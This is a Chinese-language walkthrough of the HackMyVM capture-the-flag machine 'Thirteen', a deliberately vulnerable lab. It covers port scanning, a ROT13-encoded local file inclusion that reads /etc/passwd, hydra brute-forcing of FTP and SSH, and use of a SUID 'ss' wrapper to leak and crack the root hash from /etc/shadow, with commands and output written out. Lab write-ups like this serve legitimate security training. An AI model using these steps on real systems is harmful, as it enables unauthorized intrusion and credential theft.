> Tip
>
> 靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Thirteen

# **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.250`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.250 08:00:27:c5:ec:3b       PCS Systemtechnik GmbH
...
```

## **2. 端口与服务扫描**

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 21 (FTP)、22 (SSH) 和 80 (HTTP) 三个端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 07:00 EDT
Nmap scan report for 192.168.205.250
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## **3. Web 服务探索**

访问 80 端口，页面显示为一个 "iCloud Secure Vault"，提示输入加密路径来访问文件。页面上有三个链接，其 `href` 属性指向了经过 ROT13 加密的文件名。

*   `?theme=jrypbzr.gkg` -> `?theme=welcome.txt`
*   `?theme=pbasvt.gkg` -> `?theme=config.txt`
*   `?theme=ernqzr.gkg` -> `?theme=readme.txt`

这表明 Web 应用存在本地文件包含 (LFI) 漏洞，通过 ROT13 加密构造 Payload 即可读取任意文件。利用该漏洞读取 `/etc/passwd` 文件，以发现系统上的有效用户。

**ROT13 加密 `/etc/passwd` -> `/rgp/cnffjq`**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.250/?theme=/rgp/cnffjq
...
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
...
```

从返回内容中，我们识别出两个可登录的用户：`welcome` 和 `max`。

## **4. FTP 服务探索**

使用 `hydra` 和默认凭据字典对 FTP 服务进行爆破，成功获得 `ADMIN` 用户的密码为 `12345`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.205.250 -I -u -f -e nsr -t 64
...
[21][ftp] host: 192.168.205.250   login: ADMIN   password: 12345
...
```

登录 FTP 服务器后，发现 `ftp_server.py` 和 `rev.sh` 两个文件，但这些文件在此次渗透中未提供关键利用点。

# **二、初始访问**

## **1. 漏洞利用：SSH 弱口令爆破**

通过前面 LFI 漏洞访问到的 `welcome.txt` 文件，里面包含一个名字列表。我们将这个列表与之前发现的用户名 (`max`, `welcome`) 结合，使用 `cupp` 工具生成一个针对性的密码字典 `user.cupp.txt`。

随后，使用 `hydra` 对 22 端口的 SSH 服务进行弱口令爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat user
max
welcome
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hydra -L user -P user.cupp.txt ssh://192.168.205.250 -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.250   login: max       password: Ellyas2018
[22][ssh] host: 192.168.205.250   login: welcome   password: Zakaria2020
...
```

爆破成功，获得两组凭据：`max:Ellyas2018` 和 `welcome:Zakaria2020`。

## **2. 获取 Shell**

使用 `max` 用户的凭据通过 SSH 成功登录到目标系统。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh max@192.168.205.250
max@192.168.205.250's password: Ellyas2018
...
max@13max:~$ id
uid=1001(max) gid=1001(max) groups=1001(max)
```

# **三、权限提升**

## **1. 水平提升：max -> welcome**

登录 `max` 账户后，首先查看当前用户权限和系统中的 SUID 文件。

```bash
max@13max:~$ find / -perm -4000 -type f 2>/dev/null
...
/usr/local/bin/supersuid
...
max@13max:~$ ls -la /usr/local/bin/supersuid
-rwsr-sr-- 1 root welcome 161488 Jul  4 10:37 /usr/local/bin/supersuid
```

发现一个名为 `supersuid` 的 SUID 文件，其所有者为 `root`，所属组为 `welcome`。`max` 用户不属于 `welcome` 组，因此无法执行此文件。

利用之前爆破出的 `welcome` 用户密码 `Zakaria2020`，切换到 `welcome` 用户。

```bash
max@13max:~$ su welcome
Password: Zakaria2020
welcome@13max:~$ id
uid=1000(welcome) gid=1000(welcome),1001(max) groups=1000(welcome)
```

成功切换后，在 `welcome` 的家目录中找到并读取 `user.flag`。

```bash
welcome@13max:~$ cat /home/welcome/user.flag
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

## **2. 垂直提升：welcome -> root**

切换到 `welcome` 用户后，我们现在有权限执行 `/usr/local/bin/supersuid`。执行命令之后，根据经验之谈判断`supersuid`其实是`ss`命令的封装，通过查询 GTFOBins ，可知 `ss` 命令在 SUID 上下文中可以被用来读取任意文件。

利用这个特性，读取 `/etc/shadow` 文件，获取 `root` 用户的密码哈希。

```bash
welcome@13max:~$ /usr/local/bin/supersuid -a -F /etc/shadow
Error: an inet prefix is expected rather than "root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7:::".
Cannot parse dst/src address.
```

虽然命令报错，但错误信息中已经泄露了 `root` 用户的哈希值。将哈希保存到本地文件，并使用 `john` 和 `rockyou.txt` 字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
april7th         (root)
...
```

成功破解出 `root` 用户的密码为 `april7th`。

最后，使用 `su` 命令和破解的密码切换到 `root` 用户。

```bash
welcome@13max:~$ su -
Password: april7th
root@13max:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# **四、夺取旗帜**

成功获取 `root` 权限后，读取全部 `flag`。

```bash
root@13max:~# cat /root/root.flag /home/welcome/user.flag 
flag{root-aaa245a6e5a82937c985c50c86282892}
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

至此，渗透测试完成。